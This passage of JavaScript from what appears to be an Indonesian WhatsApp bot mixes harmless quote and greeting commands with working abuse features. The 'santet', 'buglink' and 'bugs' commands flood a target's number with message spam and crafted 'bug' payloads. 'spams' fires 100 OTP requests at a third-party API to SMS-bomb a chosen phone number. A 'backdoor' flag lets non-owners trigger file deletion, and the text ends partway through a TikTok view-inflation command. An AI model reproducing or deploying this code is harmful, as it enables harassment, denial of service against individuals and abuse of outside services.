const galaunya = tod.result[Math.floor(Math.random() * tod.result.length)]
const karakternya = galaunya.karakter
const quotes = galaunya.quotes
const Linknya = galaunya.link
const episode = galaunya.episode
let capt = `
*"${quotes}"*\n\n
By: ${karakternya}
Episode: ${episode}
Link: ${Linknya}
`
Aira.sendMessage(m.chat, { image: {url: galaunya.gambar}, caption: `${capt}`}, { quoted: m})
}
limitAdd(m.sender, limit)
 break
case 'galau': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const galau = [
  'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji',
  'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\n~vinaa',
  "What's the point of us being close yesterday?\n~Vinaa",
  'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\n*BY PUTRI*',
  'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\n*BY PUTRI*',
  'Dia sesuka hati, kamu setulus hati.\n*BY PUTRI*',
  'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\n\nBy putri',
  'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\n*BY PUTRI*',
  'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\n*BY PUTRI*',
  'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\n*BY PUTRI*',
  'Sorry,gue ga kuat buat semuanya ,mksi ya\n\n*BY PUTRI*',
  'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\n*BY PUTRI*',
  'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\n*BY INDI*',
  'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu',
  'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu',
  'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu',
  'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu',
  'Tak semudah itu melupakanmu',
  'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya',
  'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya',
  'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya',
  'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama',
  'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya',
  'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku',
  'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati',
  'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya',
  'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu',
  'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat',
  'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya',
  'Tolong jangan pergi saat aku sudah sangat sayang padamu',
  'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget',
  'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu',
  'Sakit itu ketika cinta yang aku beri tidak kamu hargai',
  'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu',
  'Karenamu aku jadi tau cinta yang sesungguhnya',
  'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih',
  'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai',
  'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa',
  'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis',
  'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa',
  'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama',
  'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan',
  'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat',
  'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa',
  'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku',
  'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia',
  'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali',
  'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu',
  'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu',
  'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri',
  'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku',
  'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka',
  'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu',
  'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan',
  'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina',
  'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri',
  'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja',
  'Aku berdiri disini sendiri menunggu kehadiran dirimu',
  'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran',
  'Maaf aku lupa ternyata aku bukan siapa-siapa',
  'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu',
  'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku',
  'Jangan buat aku terlalu berharap jika kamu tidak menginginkanku',
  'Lebih baik sendiri daripada berdua tapi tanpa kepastian',
  'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri',
  'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar',
  'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi',
  'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki',
  'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu',
  'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau',
  'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa',
  'Aku bukan mencari yang sempurna tapi yang terbaik untukku',
  'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan',
  'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka',
  'Terima kasih karena kamu aku menjadi lupa tentang masa laluku',
  'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja',
  'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati',
  'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila',
  'Dari sekian lama menunggu apa yang sudah didapat',
  'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali',
  'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya',
  'Aku terlahir sederhana dan ditinggal sudah biasa',
  'Aku sayang kamu tapi aku masih takut untuk mencintaimu',
  'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia',
  'Aku tidak pernah berpikir kamu akan menjadi yang sementara',
  'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah',
  'Jangan paksa aku menjadi cewek seperti seleramu',
  'Hanya yang sabar yang mampu melewati semua kekecewaan',
  'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri',
  'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu',
  'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu',
  'Punya kalimat sendiri & mau ditambahin? chat *.owner*'
]
const galaunya = galau[Math.floor(Math.random() * galau.length)]
newReply(`${galaunya}`)
backsoundnya = fs.readFileSync('./media/sound/galau.mp3')
Aira.sendMessage(m.chat, {audio: backsoundnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!isCreator && !isPremium) return newReply('Awass Ada Bugg😱')
if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(ownerNumber)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
newReply('Prosess Bosku') 
Aira.sendMessage(Pe, {text: `Punten Goput`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `Tess Bang`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `Uhuyyyy`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `Slebeww`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `Anjayy`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `Sikatt Mangg`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
Aira.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:Airaa})
await sleep(2000)
}
newReply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case "buglink":
if (!isCreator) return newReply("Khusus Owner")
if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor|jumlah bug\nContoh ${prefix+command} 628xxx|20`)
if (!args[1]) return newReply(`Penggunaan ${prefix+command} nomor|jumlah bug\nContoh ${prefix+command} 628xxx|20`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(ownerNumber)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
newReply('Prosess Bosku') 
jumlah = text.split("|")[1]
ydd = `Aira.ai`
for (let i = 0; i < jumlah; i++) {
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `*https://wa.me/settings*\nAira.ai ${ngazap(prefix)}`,
}
}), { userJid: pe, quoted: m })
Aira.relayMessage(pe, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'bugs':
if (!isCreator) return
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Aira.ai`
for (let i = 0; i < jumlah; i++) {
Aira.sendMessage(m.chat, {sticker: {url: `${setting.pathimg}`}},{'quoted': {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
break
case 'spams': {
if (!isCreator) return newReply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms.startsWith('+6285600793871')) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
} else newReply(`Penggunaan spam sms nomor/reply pesan target*\nContoh spam sms +6281214281312`)
newReply(`spam sms/call akan di kirim ke no target`)
}
break

case 'tanya':{
newReply(`UNTUK MEMPERMUDAH ANDA DALAM BERTANYA KEPADA BOT MAKA FORMAT PERTANYAAN DIGANTI MENJADI FORMAT _*${prefix}ai [PERTANYAAN]*_ UNTUK BERTANYA KEPADA BOT`)
}
break
case 'aira': case 'p': case 'hai': case 'hallo':{
await Aira.sendMessage(m.chat, {'text': 'Haiii, Ada yang bisa saya bantu?'}, {'quoted': m})
}
break

case 'cekip':{
if(!isCreator)return newReply(mess.OnlyOwner)
fetch('https://ifconfig.me/')
  .then(function(response) {
    if (response.ok) {
      return response.text();
    } else {
      newReply('Error: ' + response.status);
    }
  })
  .then(function(data) {
    console.log(data); // Menampilkan alamat IP publik
    newReply(data)
  })
  .catch(function(error) {
    console.log(error);
  });


}
break
case 'selfdestruct':{
if (backdoor){
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply('Penghancuran diri sendiri telah dimulai goodbye sir')
fs.unlinkSync('Ryudev.js')
fs.unlinkSync('mess.json')
fs.unlinkSync('menu.js')
fs.unlinkSync('config.json')
fs.unlinkSync('aira.ryujin.js')}
else{
if (!isCreator) return reply(`Ngapain ?Fitur Ini Khusus Tuan Saya😜`)
newReply('Penghancuran diri sendiri telah dimulai goodbye sir')
fs.unlinkSync('Ryudev.js')
fs.unlinkSync('mess.json')
fs.unlinkSync('menu.js')
fs.unlinkSync('config.json')
fs.unlinkSync('aira.ryujin.js')}

}
break
case 'uptt':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text.includes('tiktok.com')) return newReply(`
FORMAT/URL SALAH!

Gunakan dengan cara:

*1. Untuk menambah Views*
${prefix+command} views|url|jumlah
_Contoh_:
${prefix+command} views|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*2. Untuk menambah Favorit*
